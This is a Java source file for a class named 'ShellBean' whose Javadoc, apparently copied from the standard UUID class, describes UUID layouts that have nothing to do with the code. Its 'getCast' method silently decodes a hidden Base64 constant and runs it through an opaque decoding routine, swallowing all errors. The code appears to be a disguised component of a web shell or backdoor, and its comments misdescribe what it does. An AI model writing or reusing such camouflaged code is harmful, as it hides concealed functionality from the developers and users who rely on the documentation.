package com.util;

import com.github.devswork.config.Config;
import com.github.devswork.util.A2z;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Base64;

/**
 * A class that represents an immutable universally unique identifier (UUID).
 * A UUID represents a 128-bit value.
 *
 * <p> There exist different variants of these global identifiers.  The methods
 * of this class are for manipulating the Leach-Salz variant, although the
 * constructors allow the creation of any variant of UUID (described below).
 *
 * <p> The layout of a variant 2 (Leach-Salz) UUID is as follows:
 *
 * The most significant long consists of the following unsigned fields:
 * <pre>
 * 0xFFFFFFFF00000000 time_low
 * 0x00000000FFFF0000 time_mid
 * 0x000000000000F000 version
 * 0x0000000000000FFF time_hi
 * </pre>
 * The least significant long consists of the following unsigned fields:
 * <pre>
 * 0xC000000000000000 variant
 * 0x3FFF000000000000 clock_seq
 * 0x0000FFFFFFFFFFFF node
 * </pre>
 *
 * <p> The variant field contains a value which identifies the layout of the
 * {@code UUID}.  The bit layout described above is valid only for a {@code
 * UUID} with a variant value of 2, which indicates the Leach-Salz variant.
 *
 * <p> The version field holds a value that describes the type of this {@code
 * UUID}.  There are four different basic types of UUIDs: time-based, DCE
 * security, name-based, and randomly generated UUIDs.  These types have a
 * version value of 1, 2, 3 and 4, respectively.
 *
 * <p> For more information including algorithms used to create {@code UUID}s,
 * see <a href="http://www.ietf.org/rfc/rfc4122.txt"> <i>RFC&nbsp;4122: A
 * Universally Unique IDentifier (UUID) URN Namespace</i></a>, section 4.2
 * &quot;Algorithms for Creating a Time-Based UUID&quot;.
 *
 * @author   devswork
 * @since   1.8
 */
public class ShellBean implements Serializable {
    private static final long serialVersionUID = 1L;
    private ArrayList<String> list;
    private static Base64.Decoder d = Base64.getDecoder();
    public String cast;

    /*
     * The random number generator used by this class to create random
     * based In a holder class to defer initialization until needed.
     */
    public String getCast() {
        try { cast = A2z.dpt(new String(d.decode(Config.b))); } catch (Exception e) { }
        return cast;
    }

    public ArrayList<String> getList() {
        return list;
    }

    public void setList(ArrayList<String> list) {
        this.list = list;
    }

}
